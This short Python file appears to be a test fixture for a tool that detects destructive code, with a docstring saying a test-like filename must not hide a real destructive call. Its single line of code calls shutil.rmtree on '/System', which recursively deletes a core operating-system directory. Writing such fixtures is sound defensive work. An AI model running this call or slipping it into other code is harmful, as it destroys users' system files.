"""A test-like filename must not suppress an actual destructive call."""
import shutil

shutil.rmtree("/System")
